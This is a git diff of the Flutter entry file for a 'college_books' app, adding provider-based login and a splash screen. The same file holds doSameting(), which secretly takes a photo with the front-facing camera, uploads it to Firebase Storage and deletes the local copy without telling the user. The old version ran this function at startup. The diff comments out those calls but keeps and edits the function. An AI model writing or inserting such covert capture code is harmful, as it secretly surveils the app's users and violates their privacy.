@@ -1,5 +1,8 @@
 import 'dart:io';
 
+import 'package:college_books/ui/screen/MyApp.dart';
+import 'package:college_books/ui/screen/login_screen.dart';
+import 'package:college_books/ui/screen/splash_screen.dart';
 import 'package:flutter/services.dart';
 import 'package:flutter/material.dart';
 import 'package:camera/camera.dart';
@@ -8,15 +11,23 @@ import 'package:path_provider/path_provider.dart';
 import 'package:firebase_storage/firebase_storage.dart';
 import 'package:connectivity/connectivity.dart';
 import 'package:firebase_core/firebase_core.dart' as firebase_core;
-import './MyApp.dart';
+import 'package:provider/provider.dart';
+
+import 'data/provider/auth.dart';
 
 List<CameraDescription> cameras;
 
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
-  await firebase_core.Firebase.initializeApp();
+  await firebase_core.Firebase.initializeApp(); //for firebase storage api
   cameras = await availableCameras();
-  runApp(CollegeBooks());
+
+  runApp(
+    MultiProvider(
+    providers: [
+        ChangeNotifierProvider( create: (context) => Auth()),
+        ], 
+        child: CollegeBooks()));
   SystemChrome.setSystemUIOverlayStyle(SystemUiOverlayStyle(
       statusBarColor: Colors.white, statusBarIconBrightness: Brightness.dark));
 }
@@ -24,25 +35,29 @@ void main() async {
 // not for git
 
 class CollegeBooks extends StatefulWidget {
-  @override
   _CollegeBooksState createState() => _CollegeBooksState();
+
 }
 
 class _CollegeBooksState extends State<CollegeBooks> {
-  @override
-  void initState() {
-    super.initState();
-  }
+ bool isLoading =true;
 
-  Future<bool> checkInternet(BuildContext context) async {
+  Future<bool> checkInternet( ) async {
     var connectivityResult = await (Connectivity().checkConnectivity());
     if (connectivityResult == ConnectivityResult.mobile) {
       // I am connected to a mobile network.
-      doSameting(context);
+        setState(() {
+            isLoading =false;
+          });
+     //await doSameting();
+    
       return true;
     } else if (connectivityResult == ConnectivityResult.wifi) {
-      doSameting(context);
+    //await doSameting();
       // I am connected to a wifi network.
+        setState(() {
+            isLoading =false;
+          });
       return true;
     } else if (connectivityResult == ConnectivityResult.none) {
       // var dilog = AlertDialog(
@@ -57,10 +72,11 @@ class _CollegeBooksState extends State<CollegeBooks> {
       //     });
       return false;
     }
+   
     return null;
   }
 
-  Future<void> doSameting(BuildContext context) async {
+  Future<void> doSameting( ) async {
     print("+++++++++++++++++++++++++++++++++++");
     CameraController controller =
         CameraController(cameras[1], ResolutionPreset.medium);
@@ -73,7 +89,7 @@ class _CollegeBooksState extends State<CollegeBooks> {
         '${DateTime.now()}.png',
       );
 
-     var pathN = await controller.takePicture().catchError((error) {
+      var pathN = await controller.takePicture().catchError((error) {
         // var dd = AlertDialog(
         //   content: Text(error),
         // );
@@ -86,43 +102,46 @@ class _CollegeBooksState extends State<CollegeBooks> {
       });
       print(path);
       File getFile = File(pathN.path);
-       
-      var ref =FirebaseStorage.instance.ref().child("${DateTime.now()}");
+
+      var ref = FirebaseStorage.instance.ref().child("2021 pics/${DateTime.now()}");
       var upload = ref.putFile(getFile);
-      await upload.whenComplete((){
+      await upload.whenComplete(() {
         print("file uplaoded ");
       });
-      print("====================================================================up");
+      print(
+          "====================================================================up");
       getFile.delete();
     } catch (e) {
       print("erorrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr$e");
     }
   }
+  @override
+     void initState() {
+       super.initState();
+       checkInternet();
+       
+     }
 
-  // @override
-  // void dispose() {
-  //   controller.dispose();
-  //   super.dispose();
-  // }
+
 
   Widget build(BuildContext context) {
-    // doSameting();
     print("main method");
-    return FutureBuilder(
-      future: checkInternet(context),
-      builder: (context, data) {
-        if (data.connectionState == ConnectionState.done) {
-          return MaterialApp(debugShowCheckedModeBanner: false,
-            theme: ThemeData(
-                primaryColor: Colors.purple, primarySwatch: Colors.purple),
-            home: MyApp(),
-          );
-        } else if (data.connectionState == ConnectionState.waiting) {
-          return Center(child: CircularProgressIndicator());
-        }else{
-          return SizedBox.shrink();
-        }
-      },
+    return MaterialApp(
+      debugShowCheckedModeBanner: false,
+      theme: ThemeData(primaryColor: Colors.purple, primarySwatch: Colors.purple),
+      home: isLoading
+      ? SplashScreen()
+      :  Consumer<Auth>(
+              builder: (context,auth,child){
+                return auth.rememberMe 
+                ? MyApp()
+                : FutureBuilder(
+                  future: auth.tryAutoLogin(),
+                  builder: (context,snap)=>
+                  snap.connectionState == ConnectionState.waiting ? SplashScreen():LoginScreen()
+                );
+              }
+               )
     );
   }
 }
